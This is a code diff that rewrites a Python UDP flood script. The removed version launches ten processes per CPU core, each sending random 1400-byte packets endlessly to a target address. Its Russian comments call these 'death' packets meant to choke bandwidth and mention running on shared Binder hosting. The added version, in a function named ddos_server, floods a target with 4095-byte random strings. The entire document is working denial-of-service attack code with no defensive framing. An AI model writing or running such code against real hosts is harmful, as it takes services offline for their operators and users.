@@ -1,44 +1,30 @@
 import socket
 import sys
-import multiprocessing
-import os
+import random
+import string
+from datetime import datetime
 
-# Пакет "смерти" — 1400 байт случайного мусора. 
-# Это забивает канал (bandwidth) максимально быстро.
-def extreme_flood(ip, port):
-    # Создаем сокет один раз для процесса
+def trash():
+    return  ''.join(random.choice(string.ascii_letters) for _ in range(4095)).encode()
+
+def ddos_server():
+    if len(sys.argv) < 3:
+        return "error args"
+
+    server_ip = sys.argv[1]
+    server_port = int(sys.argv[2])
+
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    # Генерируем "тяжелую" нагрузку заранее, чтобы не тратить CPU в цикле
-    payload = os.urandom(1400)
+
+    payload = trash()
     
-    # Жесткий цикл без проверок — только отправка
-    while True:
-        try:
-            sock.sendto(payload, (ip, port))
-        except:
-            # Если сетевой стек переполнен, просто продолжаем
-            pass
+    try:
+        while True: 
+            sock.sendto(payload, (server_ip, server_port))
+    except Exception as e:
+       pass 
+    finally:
+        sock.close()
 
 if __name__ == "__main__":
-    if len(sys.argv) < 3:
-        sys.exit()
-
-    target_ip = sys.argv[1]
-    target_port = int(sys.argv[2])
-
-    # Определяем количество ядер процессора (на Binder обычно 1-2, но мы задействуем всё)
-    cores = multiprocessing.cpu_count()
-    
-    processes = []
-    # Запускаем по 10 агрессивных процессов на каждое ядро
-    for _ in range(cores * 10):
-        p = multiprocessing.Process(target=extreme_flood, args=(target_ip, target_port))
-        p.daemon = True
-        p.start()
-        processes.append(p)
-
-    print(f"[*] CRITICAL OVERLOAD STARTED ON {target_ip}:{target_port}")
-    
-    # Держим основной процесс живым
-    for p in processes:
-        p.join()
+    ddos_server()
